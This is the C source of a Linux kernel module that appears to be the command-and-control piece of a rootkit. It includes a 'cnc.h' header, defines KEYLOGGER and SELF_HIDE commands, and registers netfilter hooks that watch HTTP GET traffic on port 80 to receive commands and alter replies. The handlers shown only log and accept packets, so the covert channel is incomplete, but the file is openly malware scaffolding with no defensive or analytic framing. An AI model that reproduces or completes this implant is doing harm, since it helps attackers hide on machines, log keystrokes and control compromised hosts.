#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/version.h>
#include "cnc.h"

struct nf_hook_ops http_hook_out;
struct nf_hook_ops http_hook_in;


unsigned int http_callback( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *));

typedef enum {
	KEYLOGGER = 0,
	SELF_HIDE
}COMMANDS;


struct cnc_http_magic {
	unsigned int magic;
	COMMANDS comm;
};


#define MAX_HTTP_HEADER_LEN 2048
#define MAX_HTTP_DATA_LEN 1024
#define GET_1 0x20544547
#define GET_2 0x50545448




unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct ethhdr *ethh = NULL;
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	u32 *httph = NULL;
	int tcp_src_port;
	int tcp_data_len=0;
	unsigned char *tcp_data = NULL;
	unsigned char *http_data = NULL;
	unsigned char c = 0;
	unsigned char header_buf[MAX_HTTP_HEADER_LEN] = {0};
	unsigned int url_len = 0;
	unsigned int host_len = 0;
	unsigned int ua_len = 0;
	unsigned int cookie_len = 0;
	unsigned int content_length = 0;
	int i = 0, j = 0;

	iph = ip_hdr(pskb);
	if (NULL == iph) {
		return NF_ACCEPT;
	}
	if (IPPROTO_TCP != iph->protocol) { // Not TCP
		return NF_ACCEPT;
	}

	tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
	if (NULL == tcph) {
		return NF_ACCEPT;
	}

	tcp_src_port = ntohs(tcph->source);

	if (80 != tcp_src_port) {
		return NF_ACCEPT;
	}


	if (!tcph->psh) { // TCP three-way handshake
		return NF_ACCEPT;
	}
	tcp_data_len = iph->tot_len - (iph->ihl << 2) - (tcph->doff << 2);
	tcp_data = (unsigned char *)(pskb->data + (iph->ihl << 2) + (tcph->doff << 2));

	httph = (u32 *)tcp_data;
	
	if (*httph != GET_1 && *httph != GET_2 ) { // Not GET
		return NF_ACCEPT;
	}
	printk("saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
	printk("HTTP GET DETECTED -> CHANGE PACKET\n");
	return NF_ACCEPT;
}


unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct ethhdr *ethh = NULL;
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	u32 *httph = NULL;
	int tcp_dst_port;
	int tcp_data_len=0;
	unsigned char *tcp_data = NULL;
	unsigned char *http_data = NULL;
	unsigned char c = 0;
	unsigned char header_buf[MAX_HTTP_HEADER_LEN] = {0};
	unsigned int url_len = 0;
	unsigned int host_len = 0;
	unsigned int ua_len = 0;
	unsigned int cookie_len = 0;
	unsigned int content_length = 0;
	int i = 0, j = 0;

	iph = ip_hdr(pskb);
	if (NULL == iph) {
		return NF_ACCEPT;
	}
	if (IPPROTO_TCP != iph->protocol) { // Not TCP
		return NF_ACCEPT;
	}

	tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
	if (NULL == tcph) {
		return NF_ACCEPT;
	}

	tcp_dst_port = ntohs(tcph->dest);


	if (80 != tcp_dst_port) {
		return NF_ACCEPT;
	}


	if (!tcph->psh) { // TCP three-way handshake
		return NF_ACCEPT;
	}
	tcp_data_len = iph->tot_len - (iph->ihl << 2) - (tcph->doff << 2);
	tcp_data = (unsigned char *)(pskb->data + (iph->ihl << 2) + (tcph->doff << 2));

	httph = (u32 *)tcp_data;
	
	if (*httph != GET_1 && *httph != GET_2 ) { // Not GET
		return NF_ACCEPT;
	}

	printk("saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
	printk("HTTP GET DETECTED -> EXEC COMMANDS\n");
	return NF_ACCEPT;
}


void set_http_callback( void )
{
	http_hook_in.hook = (void *)http_callback_get_command;
	http_hook_in.hooknum = NF_INET_PRE_ROUTING;
	http_hook_in.pf = PF_INET;
	http_hook_in.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &http_hook_in);
#else
	nf_register_hook(&http_hook_in);
#endif


	http_hook_out.hook = (void *)http_callback_result;
	http_hook_out.hooknum = NF_INET_POST_ROUTING;
	http_hook_out.pf = PF_INET;
	http_hook_out.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &http_hook_out);
#else
	nf_register_hook(&http_hook_out);
#endif

}


void unset_http_callback ( void )
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &http_hook_in);
#else
	nf_unregister_hook(&http_hook_in);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &http_hook_out);
#else
	nf_unregister_hook(&http_hook_out);
#endif
}
